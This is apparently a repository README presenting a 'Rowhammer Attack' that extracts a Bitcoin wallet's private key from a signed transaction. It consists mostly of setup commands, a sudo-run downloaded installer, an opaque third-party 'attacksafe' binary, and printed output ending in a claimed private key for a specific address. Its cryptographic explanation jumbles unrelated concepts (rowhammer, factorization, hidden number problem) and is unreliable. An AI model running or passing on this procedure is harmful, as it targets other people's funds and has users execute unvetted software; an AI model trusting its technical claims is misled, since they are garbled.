# Rowhammer Attack

---

The biggest cryptographic strength of the Bitcoin cryptocurrency is a computational method in discrete mathematics that takes the factorization problem of large integers and the hidden number problem (HNP) in the Bitcoin ECDSA signature transaction as a basis.
Rowhammer Attack on Bitcoin, allows us to efficiently find all zeros for normalized polynomials modulo a certain value, and we adapt this method to the ECDSA signature algorithm, more precisely to critically vulnerable transactions in the Bitcoin blockchain.
We will apply ECDSA signature differential failure analysis and obtain a private key from a transaction for different Bitcoin Wallets.



---

* Tutorial: https://youtu.be/lfYPcXPzLjE
* Tutorial: https://cryptodeep.ru/rowhammer-attack

---

# Commands:





    git clone https://github.com/demining/CryptoDeepTools.git


    cd CryptoDeepTools/15RowhammerAttack/

    ls

    wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

    sudo python2 get-pip.py

    pip2 install -r requirements.txt


---


## With a critical vulnerability, we can get the private key to the Bitcoin Wallet:


https://btc1.trezor.io/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o

https://btc1.trezor.io/tx/3c79fae7e31a32e12d55f2e0c91d88e11d6f16faa35f1ec85bd7d768a1c18846


---



    RawTX = 0100000001cb9a792b88760ad20c67047c06d016ba4a069d036c4fbc5c09a8055fe786580f300000006a4730440220331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc6702200bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff401210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000


    python2 breakECDSA.py 0100000001cb9a792b88760ad20c67047c06d016ba4a069d036c4fbc5c09a8055fe786580f300000006a4730440220331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc6702200bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff401210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000


---


R = 0x331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc67

S = 0x0bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff4

Z = 0x9d86bea51385f6a56835d0148e7f23a353605bab339127e800112307e6727d2d


---

# To implement the attack and get the secret key, we will use the software: “ATTACKSAFE SOFTWARE” [ https://attacksafe.ru/software ]


---

    chmod +x attacksafe


---

    ./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt


---



## We launched this attack from -tool rowhammer_attack and the result is saved to the file SecretKey.txt


    cat SecretKey.txt


    Deployments ECDSA:

    SecretKey = 0x6251240a6cb656310dbd7f0da53a315ab88ec253352a5d5481ee08e977b6ef2d


    RawTX = 0100000001cb9a792b88760ad20c67047c06d016ba4a069d036c4fbc5c09a8055fe786580f300000006a4730440220331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc6702200bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff401210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000


---


## We see the inscription "Deployments ECDSA" which means a critical vulnerability in the Bitcoin blockchain transaction

SecretKey value in HEX format, this is our secret key "K" (NONCE):

K=0x6251240a6cb656310dbd7f0da53a315ab88ec253352a5d5481ee08e977b6ef2d


---


    pip3 install ECPy


    python3 point2gen.py 0x6251240a6cb656310dbd7f0da53a315ab88ec253352a5d5481ee08e977b6ef2d



    R          =    0x331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc67
    point2gen  =   (0x331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc67 , 0xc6efa8de714dd94d7b659d8935aa9036ada6a2b541a03360901fc195fd0e2cf6)


---


# ALL CORRECT!


K=0x6251240a6cb656310dbd7f0da53a315ab88ec253352a5d5481ee08e977b6ef2d

## Now knowing the secret key, we can get the private key to the Bitcoin Wallet: 1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o


The script: calculate.py will calculate the private key using the formula:
Privkey = ((((S * K) - Z) * modinv(R,N)) % N)


---


    python3 calculate.py


---


## PrivKey = aa35fda8f16d06ae02bdcf671e03035795a0b0ecbdae45098928f6587016a932



---


---

* Tutorial: https://youtu.be/lfYPcXPzLjE
* Tutorial: https://cryptodeep.ru/rowhammer-attack

---


|  | Donation Address |
| --- | --- |
| ♥ __BTC__ | 1Lw2kh9WzCActXSGHxyypGLkqQZfxDpw8v |
| ♥ __ETH__ | 0xaBd66CF90898517573f19184b3297d651f7b90bf |
